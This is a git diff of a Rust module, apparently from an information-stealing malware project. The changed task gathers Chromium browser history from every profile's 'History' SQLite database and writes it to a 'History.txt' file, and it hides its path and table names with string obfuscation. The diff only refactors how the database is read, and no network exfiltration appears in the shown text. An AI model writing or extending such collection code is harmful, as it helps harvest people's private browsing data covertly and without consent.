@@ -1,10 +1,9 @@
 use crate::alloc::borrow::ToOwned;
 use crate::chromium::BrowserData;
-use crate::{collect_from_all_profiles, read_sqlite3_and_map_records, to_string_and_write_all, History};
+use crate::{collect_and_read_sqlite_from_all_profiles, to_string_and_write_all, History};
 use alloc::sync::Arc;
-use alloc::vec::Vec;
-use obfstr::obfstr as s;
 use database::TableRecord;
+use obfstr::obfstr as s;
 use tasks::{parent_name, Task};
 use utils::path::Path;
 
@@ -26,7 +25,12 @@ impl Task for HistoryTask {
     parent_name!("History.txt");
 
     unsafe fn run(&self, parent: &Path) {
-        let Some(mut history) = collect_from_all_profiles(&self.browser.profiles, read_history) else {
+        let Some(mut history) = collect_and_read_sqlite_from_all_profiles(
+            &self.browser.profiles,
+            |profile| profile / s!("History"),
+            s!("Urls"),
+            extract_history_from_record
+        ) else {
             return
         };
         
@@ -35,11 +39,6 @@ impl Task for HistoryTask {
 
         let _ = to_string_and_write_all(&history, "\n\n", parent);
     }
-}
-
-fn read_history(profile: &Path) -> Option<Vec<History>> {
-    let history_path = profile / s!("History");
-    read_sqlite3_and_map_records(&history_path, s!("Urls"), extract_history_from_record)
 }
 
 fn extract_history_from_record(record: &dyn TableRecord) -> Option<History> {
